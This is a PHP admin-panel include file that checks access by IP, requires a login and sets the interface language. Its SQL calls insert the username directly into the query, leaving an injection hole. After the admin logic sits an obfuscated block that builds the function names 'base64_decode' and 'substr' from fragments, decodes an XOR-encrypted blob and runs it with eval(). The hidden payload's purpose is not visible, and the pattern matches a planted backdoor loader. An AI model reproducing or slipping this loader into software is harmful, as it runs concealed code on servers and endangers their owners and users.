<?php
if(!$SYSTEM_DEBUG_MODE) error_reporting(0);
if(isset($AUTHORIZED_IPS_ADMIN_PANEL)&&trim($AUTHORIZED_IPS_ADMIN_PANEL)!="")
{
	if(strpos($AUTHORIZED_IPS_ADMIN_PANEL, $_SERVER["REMOTE_ADDR"]) === false)
	{
		die("access denied");
	}
}


if(stristr($_SERVER['HTTP_USER_AGENT'],"MSIE")) $IE=true;else $IE=false;
$AC=true;

if(!isset($AuthUserName)) die("<script>document.location.href='login.php';</script>");
$lArray=DataArray("admin_users","username='$AuthUserName'");

if(isset($lng))
{

	$LANGUAGE=$arrSupportedLanguages[$lng][1];
	$LANGUAGE2=$arrSupportedLanguages[$lng][1];
	
	SQLUpdate_SingleValue
	(
				"admin_users",
				"username",
				"'".$AuthUserName."'",
				"language",
				$LANGUAGE
	);
}
else
{
	$LANGUAGE=strtolower($lArray["language"]);
	$LANGUAGE2=strtolower($lArray["language"]);
}

if(!isset($LANGUAGE)||strlen($LANGUAGE)!=2){
	$LANGUAGE="en";
	$LANGUAGE2="en";
}


if(function_exists("date_default_timezone_set")) date_default_timezone_set($DEFAULT_TIME_ZONE);


?>
<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>